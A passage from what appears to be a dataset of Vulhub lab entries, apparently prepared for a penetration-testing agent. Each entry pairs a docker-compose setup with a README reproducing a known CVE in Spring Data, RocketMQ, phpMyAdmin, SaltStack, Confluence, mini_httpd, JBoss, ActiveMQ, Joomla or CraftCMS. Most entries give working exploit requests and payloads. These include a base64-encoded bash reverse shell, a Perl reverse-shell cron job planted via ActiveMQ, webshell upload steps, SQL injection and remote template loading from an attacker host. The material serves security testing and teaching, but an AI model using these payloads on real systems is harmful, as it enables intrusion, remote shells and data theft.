ex=\\\"freemarker.template.utility.Execute\\\"?new()> ${ex(\\\"id\\\")}'\" }\n```\n\nThe `id` command has been executed successfully:\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2018-1273.md",
    "filenamenomd": "CVE-2018-1273",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/spring/CVE-2018-1273/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/spring/CVE-2018-1273/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 90 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n spring:\n   image: vulhub/spring-data-commons:2.0.5\n   ports:\n    - \"8080:8080\"\n\n```\n\n",
    "readme": "# Spring Data Commons Remote Code Execution (CVE-2018-1273)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nSpring Data is an open-source framework designed to simplify database access and support cloud services. Spring Data Commons serves as the foundational framework shared by all sub-projects under Spring Data.\n\nIn versions 2.0.5 and earlier of Spring Data Commons, there exists a SpEL (Spring Expression Language) injection vulnerability that allows attackers to inject malicious SpEL expressions to execute arbitrary commands.\n\nReference links:\n\n- https://pivotal.io/security/cve-2018-1273\n- https://xz.aliyun.com/t/2269\n- https://mp.weixin.qq.com/s?__biz=MzU0NzYzMzU0Mw==&mid=2247483666&idx=1&sn=91e3b2aab354c55e0677895c02fb068c\n\n## Environment Setup\n\nExecute the following command to start a Web application based on Spring Data Commons 2.0.5:\n\n```\ndocker compose up -d\n```\n\nAfter a short wait and once the server starts, visit `http://your-ip:8080/users` to see a user registration page.\n\n## Vulnerability Reproduce\n\nReferring to the payload from the reference links, intercept the registration request and modify it to the following:\n\n```\nPOST /users?page=&size=5 HTTP/1.1\nHost: localhost:8080\nConnection: keep-alive\nContent-Length: 124\nPragma: no-cache\nCache-Control: no-cache\nOrigin: http://localhost:8080\nUpgrade-Insecure-Requests: 1\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nReferer: http://localhost:8080/users?page=0&size=5\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\n\nusername[#this.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"touch /tmp/success\")]=&password=&repeatedPassword=\n```\n\nExecute `docker compose exec spring bash` to enter the container, and you can see that `/tmp/success` has been successfully created, indicating that the command execution was successful:\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2023-33246.md",
    "filenamenomd": "CVE-2023-33246",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/rocketmq/CVE-2023-33246/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/rocketmq/CVE-2023-33246/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 166 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n rocketmq:\n   image: vulhub/rocketmq:5.1.0\n   ports:\n     - 10911:10911\n     - 5005:5005\n   command: [\"mqbroker\", \"-n\", \"localhost:9876\", \"--enable-proxy\"]\n\n```\n\n",
    "readme": "# Apache RocketMQ Broker Remote Command Execution (CVE-2023-33246)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nRocketMQ is a distributed messaging and streaming platform with low latency, high performance and reliability, trillion-level capacity and flexible scalability.\n\nFor RocketMQ versions 5.1.0 and below, under certain conditions, there is a risk of remote command execution. Several components of RocketMQ, including NameServer, Broker, and Controller, are leaked on the extranet and lack permission verification, an attacker can exploit this vulnerability by using the update configuration function to execute commands as the system users that RocketMQ is running as. Additionally, an attacker can achieve the same effect by forging the RocketMQ protocol content. To prevent these attacks, users are recommended to upgrade to version 5.1.1 or above for using RocketMQ 5.x or 4.9.6 or above for using RocketMQ 4.x.\n\nReferences:\n\n- <https://github.com/I5N0rth/CVE-2023-33246>\n- <https://github.com/Le1a/CVE-2023-33246>\n- <https://paper.seebug.org/2081/>\n- <https://xz.aliyun.com/news/12137>\n- <https://xz.aliyun.com/news/12035>\n\n## Vulnerable environment\n\nUse following command to start a RocketMQ broker 5.1.0:\n\n```shell\ndocker compose up -d\n```\n\nAfter the environment is started, the RocketMQ broker will listen on port 10911.\n\n## Exploit\n\nThe vulnerability exists in the configuration update functionality of RocketMQ's Broker component. The Broker component lacks proper authentication and input validation in its configuration update interface, allowing attackers to modify configuration values.\n\nWhat makes this vulnerability particularly dangerous is RocketMQ's filter server mechanism. Every 30 seconds, RocketMQ executes the filter server by running a shell command. This command is constructed by concatenating strings that include the `rocketmqHome` value from the configuration. Since an attacker can control this configuration value and it's used directly in command construction without proper sanitization, this leads to command injection.\n\nI made a simple [exploit project](https://github.com/vulhub/rocketmq-attack) to reproduce the vulnerability and execute arbitrary commands.\n\n```shell\nwget https://github.com/vulhub/rocketmq-attack/releases/download/1.0/rocketmq-attack-1.0-SNAPSHOT.jar\njava -jar rocketmq-attack-1.0-SNAPSHOT.jar AttackBroker --target your-ip:10911 --cmd \"touch /tmp/success\"\n```\n\nWait for up to 30 seconds, and you will see the `touch /tmp/success` command has been executed.\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2016-5734.md",
    "filenamenomd": "CVE-2016-5734",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/phpmyadmin/CVE-2016-5734/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/phpmyadmin/CVE-2016-5734/config.inc.php\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/phpmyadmin/CVE-2016-5734/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 284 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n web:\n   image: vulhub/phpmyadmin:4.4.15.6\n   volumes:\n    - ./config.inc.php:/var/www/html/config.inc.php\n   ports:\n    - \"8080:80\"\n   depends_on:\n    - mysql\n mysql:\n   image: mysql:5.5\n   environment: \n    - MYSQL_ROOT_PASSWORD=root\n    - MYSQL_DATABASE=test\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/phpmyadmin/CVE-2016-5734/config.inc.php\n\n- Extension: .php\n- Language: php\n- Size: 713 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```php\n<?php\n/*\n * Generated configuration file\n * Generated by: phpMyAdmin 4.6.2 setup script\n * Date: Mon, 07 May 2018 10:48:03 +0000\n */\n\n/* Servers configuration */\n$i = 0;\n\n/* Server: mysql [1] */\n$i++;\n$cfg['Servers'][$i]['verbose'] = 'mysql';\n$cfg['Servers'][$i]['host'] = 'mysql';\n$cfg['Servers'][$i]['port'] = 3306;\n$cfg['Servers'][$i]['socket'] = '';\n$cfg['Servers'][$i]['connect_type'] = 'tcp';\n$cfg['Servers'][$i]['auth_type'] = 'cookie';\n$cfg['Servers'][$i]['user'] = 'root';\n$cfg['Servers'][$i]['password'] = '';\n\n/* End of servers configuration */\n\n$cfg['blowfish_secret'] = '5af02eda401ae8.69737537';\n$cfg['DefaultLang'] = 'en';\n$cfg['ServerDefault'] = 1;\n$cfg['UploadDir'] = '';\n$cfg['SaveDir'] = '';\n?>\n```\n\n",
    "readme": "# PhpMyAdmin 4.0.x—4.6.2 Remote Code Execution Vulnerability (CVE-2016-5734)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nPhpMyAdmin is a free software tool written in PHP, intended to handle the administration of MySQL over the Web. The vulnerability is in the `preg_replace` function, because the information submitted by the user can be spliced into the first parameter.\n\nBefore PHP 5.4.7, the first parameter of `preg_replace` could be truncated with `\\0` and the change search pattern to `\\e`. It can cause remote code execution vulnerability.\n\nAffected versions:\n\n- 4.0.x version before 4.0.10.16\n- 4.4.x version before 4.4.15.7\n- 4.6.x version before 4.6.3 (actually because this version requires PHP5.5+, this vulnerability cannot be reproduced)\n\n## Setup\n\nExecute following commands to start PHP 5.3 + Apache + phpMyAdmin 4.4.15.6:\n\n```\ndocker compose up -d \n```\n\nAfter start, visit `http://your-ip:8080` and you will see the login page of phpMyAdmin. Log in with `root`:`root`.\n\n## Exploit\n\nThis vulnerability requires login and the permission to write data.\n\nWe use this POC(https://www.exploit-db.com/exploits/40185/) to reproduce the vulnerability.\n\n```\n./cve-2016-5734.py -c 'system(id);' -u root -p root -d test http://your-ip:8080/\n```\n\nResult:\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2020-16846.md",
    "filenamenomd": "CVE-2020-16846",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/saltstack/CVE-2020-16846/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/saltstack/CVE-2020-16846/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 134 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n saltstack:\n   image: vulhub/saltstack:3002\n   ports:\n    - \"8000:8000\"\n    - \"4505:4505\"\n    - \"4506:4506\"\n    - \"2222:22\"\n\n```\n\n",
    "readme": "# SaltStack Command Injection Remote Code Execution (CVE-2020-16846)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nSalt is a new approach to infrastructure management built on a dynamic communication bus. Salt can be used for data-driven orchestration, remote execution for any infrastructure, configuration management for any app stack, and much more.\n\nIn November 2020, SaltStack officially disclosed two vulnerabilities, CVE-2020-16846 and CVE-2020-25592. CVE-2020-25592 allows arbitrary user to use the SSH module, and CVE-2020-16846 allows users to execute arbitrary commands. Chain these two vulnerabilities will allow unauthorized attackers to execute arbitrary commands through the Salt API.\n\nReferences:\n\n- https://mp.weixin.qq.com/s/R8qw_lWizGyeJS0jOcYXag\n- https://docs.saltstack.com/en/latest/ref/netapi/all/salt.netapi.rest_cherrypy.html\n\n## Vulnerable Environment\n\nExecute the following command to start a SaltStack-Master service:\n\n```\ndocker compose up -d\n```\n\nAfter the SaltStack-Master is started, the following ports will be listened:\n\n- 4505/4506: SaltStack-Master server, which is a bridge between master and minions\n- 8000: Salt's API server, **SSL requiring**\n- 2222: SSH server inside the container\n\n## Exploit\n\nSend the following request to `https://your-ip:8000/run`:\n\n```\nPOST /run HTTP/1.1\nHost: 127.0.0.1:8000\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: application/x-yaml\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nDNT: 1\nConnection: close\nUpgrade-Insecure-Requests: 1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 87\n\ntoken=12312&client=ssh&tgt=*&fun=a&roster=whip1ash&ssh_priv=aaa|touch%20/tmp/success%3b\n```\n\nInject the command `touch /tmp/success` through the `ssh_priv` parameter:\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2019-3396.md",
    "filenamenomd": "CVE-2019-3396",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/confluence/CVE-2019-3396/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/confluence/CVE-2019-3396/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 241 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n  web:\n    image: vulhub/confluence:6.10.2\n    ports:\n      - \"8090:8090\"\n    depends_on:\n      - db\n  db:\n    image: postgres:10.7-alpine\n    environment: \n    - POSTGRES_PASSWORD=postgres\n    - POSTGRES_DB=confluence\n```\n\n",
    "readme": "# Atlassian Confluence Path Traversal Leads to RCE (CVE-2019-3396)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nConfluence is a web-based corporate wiki developed by Australian software company Atlassian.\n\nAn unauthorized directory traversal vulnerability exists before version 6.14.2 of Atlassian Confluence, which an attacker can read arbitrary files or execute arbitrary commands using Velocity template injection.\n\nReference:\n\n- https://paper.seebug.org/884/\n- https://jira.atlassian.com/browse/CONFSERVER-57974\n\n## Vulnerability Environment\n\nStart a Confluence Server 6.10.2 by executing the following command.\n\n```\ndocker compose up -d\n```\n\nAfter the environment starts, visit ``http://your-ip:8090`` and you will see the installation guide, select \"Trial installation\", then you will be asked to fill in the license key. You should apply for a Confluence Server test certificate from Atlassian:\n\n![](1.png)\n\nThen just click Next to install. This step of small memory VPS may fail to install or take a long time (it is recommended to use a machine with more than 4G memory for installation and testing), please wait patiently.\n\nIf prompted to fill in the cluster node, the path can be filled in with `/home/confluence`.\n\n![](4.png)\n\nYou may be asked to fill in the database account password, choose the postgres database, the address is `db`, the account password is `postgres`:\n\n![](5.png)\n\n## Exploit\n\nThe file `web.xml` can be read by sending the following packet.\n\n```\nPOST /rest/tinymce/1/macro/preview HTTP/1.1\nHost: localhost:8090\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nReferer: http://localhost:8090/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&\nContent-Type: application/json; charset=utf-8\nContent-Length: 176\n\n{\"contentId\": \"786458\", \"macro\":{\"name\": \"widget\", \"body\":\"\", \"params\":{\"url\": \"https://www.viddler.com/v/23464dc6\", \"width\": \"1000\",\" height\": \"1000\",\"_template\":\". /web.xml\"}}}\n```\n\n![](6.png)\n\nConfluence before 6.12 did not restrict the protocol and path for file reading, we can use `file:///etc/passwd` to read files, or `https://...` to load remote files.\n\nIf the file is a Velocity template, and we can execute arbitrary commands via template injection (SSTI):\n\n![](7.png)\n"
  },
  {
    "filename": "CVE-2018-18778.md",
    "filenamenomd": "CVE-2018-18778",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/mini_httpd/CVE-2018-18778/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/mini_httpd/CVE-2018-18778/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 162 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n web:\n   image: vulhub/mini_httpd:1.29\n   command:  mini_httpd -p 8080 -u www-data -h 0.0.0.0 -D -l /dev/stdout -v -T utf-8\n   ports:\n    - \"8080:8080\"\n\n```\n\n",
    "readme": "# ACME mini_httpd Arbitrary File Read (CVE-2018-18778)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nACME mini_httpd is a tiny HTTP server that maintains a certain level of performance (about 90% of Apache) while consuming minimal system resources. Therefore, it is widely used as an embedded server in various IoT devices (routers, switches, cameras, etc.). Devices from manufacturers including Huawei, zyxel, Hikvision, and Raspberry Pi have used the Mini_httpd component.\n\nWhen mini_httpd is running in virtual host mode, user requests to `http://HOST/FILE` will access the `HOST/FILE` file in the current directory.\n\n```c\n(void) snprintf( vfile, sizeof(vfile), \"%s/%s\", req_hostname, f );\n```\n\nLooking at the code above, the analysis is as follows:\n\n- When HOST=`example.com` and FILE=`index.html`, the above statement results in `example.com/index.html`, and the file is read normally.\n- When HOST is empty and FILE=`etc/passwd`, the above statement results in `/etc/passwd`.\n\nThe latter is treated as an absolute path, thus reading `/etc/passwd`, causing an arbitrary file read vulnerability.\n\nReference:\n\n- https://nvd.nist.gov/vuln/detail/CVE-2018-18778\n- https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2018/CVE-2018-18778.yaml\n\n## Environment Setup\n\nExecute the following command to start mini_httpd 1.29:\n\n```\ndocker compose up -d\n```\n\nAfter the server starts, visit `http://your-ip:8080` to see the web page.\n\n## Vulnerability Reproduction\n\nSend a request with an empty Host header and the absolute file path as the PATH value:\n\n```\nGET /etc/passwd HTTP/1.1\nHost: \nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\n\n\n```\n\nSuccessfully read the file:\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2017-12149.md",
    "filenamenomd": "CVE-2017-12149",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/jboss/CVE-2017-12149/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/jboss/CVE-2017-12149/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 102 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nservices:\n  jboss:\n    image: vulhub/jboss:as-6.1.0\n    ports:\n      - \"9990:9990\"\n      - \"8080:8080\"\n```\n\n",
    "readme": "# JBoss 5.x/6.x Deserialization Remote Code Execution (CVE-2017-12149)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nRed Hat JBoss Application Server is a JavaEE-based open source application server. In JBoss AS 5.x/6.x, the ReadOnlyAccessFilter filter in the HttpInvoker component attempts to deserialize data streams from clients without performing any security checks, resulting in a deserialization vulnerability.\n\nReferences:\n\n - https://mp.weixin.qq.com/s/zUJMt9hdGoz1TEOKy2Cgdg\n - https://access.redhat.com/security/cve/cve-2017-12149\n\n## Environment Setup\n\nRun the following command to start the JBoss AS 6.1.0:\n\n```\ndocker compose up -d\n```\n\nThe initial setup will take 1-3 minutes. After initialization is complete, visit `http://your-ip:8080/` to see the JBoss default page.\n\n## Vulnerability Reproduce\n\nThe vulnerability exists in the `/invoker/readonly` request, where the server performs Java deserialization on the POST content submitted by users:\n\n![](img/1.png)\n\nTherefore, we can use conventional Java deserialization vulnerability testing methods to reproduce this vulnerability.\n\n### Generate reverse shell payload\n\nWe use bash for the reverse shell, but since `Runtime.getRuntime().exec()` cannot use pipe operators and other bash methods directly, we need to encode it first.\n\nTool: http://www.jackson-t.ca/runtime-exec-payloads.html\n\n![](img/2.png)\n\n### Generate serialized data\n\nWe use [ysoserial](https://github.com/frohoff/ysoserial) to generate the serialized data. Since Vulhub uses a newer version of Java, we choose the CommonsCollections5 gadget:\n\n```\njava -jar ysoserial.jar CommonsCollections5 \"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS8yMSAwPiYx}|{base64,-d}|{bash,-i}\" > poc.ser\n```\n\n### Send the POC\n\nThe generated POC is poc.ser. Simply send this file as the POST Body to /invoker/readonly:\n\n![](img/3.png)\n\nSuccessfully obtained reverse shell:\n\n![](img/4.png)\n"
  },
  {
    "filename": "CVE-2016-3088.md",
    "filenamenomd": "CVE-2016-3088",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/activemq/CVE-2016-3088/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/activemq/CVE-2016-3088/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 124 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:59:09\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n activemq:\n   image: vulhub/activemq:5.11.1-with-cron\n   ports:\n    - \"61616:61616\"\n    - \"8161:8161\"\n```\n\n",
    "readme": "# ActiveMQ Arbitrary File Write Vulnerability (CVE-2016-3088)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\n## Environment setup\n\nEnter following commands to build and run the vulnerability environment:\n\n```\ndocker compose up -d\n```\n\nThe environment listens to port 61616 and port 8161, of which 8161 is the web console port. This vulnerability appears in the web console.\n\nVisit `http://your-ip:8161/` to see the web page, indicating that the environment has been successfully run.\n\n## Background brief\n\nActiveMQ web console is divided into three applications, admin, api and fileserver, where admin is the administrator page, api is the interface, fileserver is the interface for storing files; admin and api need to log in before they can be used, fileserver does not need to log in.\n\nfileserver is a RESTful API interface. We can read and write files stored in it through HTTP requests such as GET, PUT, and DELETE. The design purpose is to compensate for the defect that the message queue operation cannot transfer and store binary files, but later found that:\n\n1. Its usage rate is not high\n2. File operations are prone to vulnerabilities\n\nTherefore, ActiveMQ has closed the fileserver application by default in 5.12.x~5.13.x (you can open it in conf/jetty.xml); after 5.14.0, the fileserver application is completely removed.\n\nIn the test process, you should pay attention to the version of ActiveMQ, prevent useless effort.\n\n## Vulnerability Details\n\nThis vulnerability appears in the Fileserver application, the vulnerability principle is actually very simple, that is, fileserver support to write files (but do not parse the JSP), while supporting the move file (MOVE request). So, we just need to write a file and then move it to any location by use a move request, causing arbitrary file write vulnerability.\n\nWrite files such as cron or ssh key\n\n1. Write Webshell\n2. Write files such as cron or ssh key\n3. Write libraries and configuration files such as jar or jetty.xml\n\nThe advantage of writing webshell is convenient, but the fileserver don't parse jsp, admin and api both need to log in to access, so it is a bit futile; The advantage of writing cron or ssh key is to directly reverse Shell, it is convenient too, the disadvantage is that you need root privileges; write jar, a little trouble (requires jar back door), write xml configuration file, this method is more reliable, but there is a futile point: we need to know ActiveMQ absolute path.\n\nLet we talk about the above several methods.\n\n### Write Webshell\n\nAs I said earlier, the Webshell needs to be written in the Admin or Api app, and both applications need to be logged in to access.\n\nThe default ActiveMQ account and password is `admin`. First, visit `http://your-ip:8161/admin/test/systemProperties.jsp` to view the absolute path of ActiveMQ:\n\n![](02.png)\n\nThen upload Webshell:\n\n```\nPUT /fileserver/2.txt HTTP/1.1\nHost: localhost:8161\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Length: 120976\n\nwebshell...\n```\n\nThen move it to the API folder (`/opt/activemq/webapps/api/s.jsp`) in the Web directory:\n\n```\nMOVE /fileserver/2.txt HTTP/1.1\nDestination: file:///opt/activemq/webapps/api/s.jsp\nHost: localhost:8161\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Length: 0\n```\n\nAccess Webshell (login required):\n\n![](03.png)\n\n### Write crontab, automate reverse shell\n\nThis is a relatively stable method. First upload the cron configuration file (note that the newline must be `\\n`, not `\\r\\n`, otherwise the crontab execution will fail):\n\n```\nPUT /fileserver/1.txt HTTP/1.1\nHost: localhost:8161\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Length: 248\n\n*/1 * * * * root /usr/bin/perl -e 'use Socket;$i=\"10.0.0.1\";$p=21;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n```\n\nMove it to `/etc/cron.d/root`:\n\n```\nMOVE /fileserver/1.txt HTTP/1.1\nDestination: file:///etc/cron.d/root\nHost: localhost:8161\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Length: 0\n```\n\nIf both of the above requests return 204, the write is successful. Waiting for the reverse shell:\n\n![](01.png)\n\nThis method requires the ActiveMQ run as root, otherwise it will not be able to write to the cron file.\n\n### Write jetty.xml or jar\n\nIn theory we can override jetty.xml, remove the login restrictions for admin and api, and then write webshell.\n\nIn some cases, the owner of jetty.xml and jar is the user of the web container, so the success rate of writing crontab is higher.\n\nNot tested yet.\n"
  },
  {
    "filename": "CVE-2017-8917.md",
    "filenamenomd": "CVE-2017-8917",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/joomla/CVE-2017-8917/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/joomla/CVE-2017-8917/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 346 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n web:\n   image: vulhub/joomla:3.7.0\n   depends_on:\n    - mysql\n   environment: \n    - JOOMLA_DB_HOST=mysql\n    - JOOMLA_DB_PORT=3306\n    - JOOMLA_DB_USER=root\n    - JOOMLA_DB_PASSWORD=vulhub\n    - JOOMLA_DB_NAME=joomla\n   ports:\n    - \"8080:80\"\n mysql:\n   image: mysql:5.7\n   environment: \n    - MYSQL_ROOT_PASSWORD=vulhub\n\n```\n\n",
    "readme": "# Joomla 3.7.0 com_fields SQL Injection Vulnerability (CVE-2017-8917)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nJoomla is a free and open-source content management system (CMS) that allows users to build websites and online applications. It was first released in 2005 and has since become one of the most popular CMS platforms, powering millions of websites around the world.\n\nAn SQL injection vulnerability is caused by a new component, com_fields, which was introduced in version 3.7.\n\nReferences:\n\n- <https://developer.joomla.org/security-centre/692-20170501-core-sql-injection.html>\n- <https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html>\n\n## Vulnerable environment\n\nExecuting following command to start a Joomla 3.4.5:\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, you can see the home page of it at `http://your-ip:8080`.\n\n## Exploit\n\nVisit following link directly to reproduce the SQL injection attack:\n\n```\nhttp://your-ip:8080/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,user()),1)\n```\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2024-56145.md",
    "filenamenomd": "CVE-2024-56145",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/craftcms/CVE-2024-56145/index.twig\n- /home/yay/pentest-agent/vulhub/sites_no_md/craftcms/CVE-2024-56145/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/craftcms/CVE-2024-56145/index.twig\n\n- Extension: .twig\n- Language: unknown\n- Size: 58 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```unknown\n{{ ['system', 'id'] | sort('call_user_func') | join('') }}\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/craftcms/CVE-2024-56145/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 203 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n web:\n   image: vulhub/craftcms:5.5.1.1\n   depends_on:\n    - db\n   ports:\n    - \"8088:80\"\n db:\n   image: mysql:8.4\n   environment: \n    - MYSQL_ROOT_PASSWORD=root\n    - MYSQL_DATABASE=craftcms\n\n```\n\n",
    "readme": "# CraftCMS `register_argc_argv` Leads to Remote Code Execution (CVE-2024-56145)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nCraftCMS is a PHP-based content management system for building websites and applications.\n\nCraftCMS version before 5.5.2 and 4.13.2 is vulnerable to remote code execution if the PHP setting `register_argc_argv` is enabled. When `register_argc_argv` is enabled, CraftCMS incorrectly reads configuration items from the HTTP request, allowing an attacker to control template files using the `--templatesPath`, which can lead to arbitrary code execution through template injection.\n\nReference:\n\n- <https://github.com/craftcms/cms/security/advisories/GHSA-2p6p-9rc9-62j9>\n- <https://www.assetnote.io/resources/research/how-an-obscure-php-footgun-led-to-rce-in-craft-cms>\n\n## Vulnerable Environment\n\nExecute the following command to start a CraftCMS server 5.5.1.1:\n\n```\ndocker-compose up -d\n```\n\nAfter the server is running, you can see the installation page at `http://<your-ip>:8088/admin/install`. Please follow the instructions to install CraftCMS, the default database address is `db` and the username and password are both `root`.\n\n![](1.png)\n\n## Vulnerability Reproduction\n\nTo reproduce the vulnerability, you need to prepare a craft `index.twig` file which contains the following content, then place it on any remote server:\n\n```twig\n{{ ['system', 'id'] | sort('call_user_func') | join('') }}\n```\n\nThen start a FTP server in the server where the `index.twig` file is located:\n\n```bash\n# install pyftpdlib\npip install pyftpdlib\n\n# start a FTP server\npython -m pyftpdlib -p 21212 -V\n```\n\nThen you can exploit the vulnerability by sending the following request:\n\n```\nhttp://<your-ip>:8088/?--templatesPath=ftp://<evil-ip>:21212/\n```\n\n![](2.png)\n\nAs you can see, the `id` command is executed and the output is returned.\n"
  },
  {
    "filename": "CVE-2020-7247.md",
    "filenamenomd": "CVE-2020-7247",
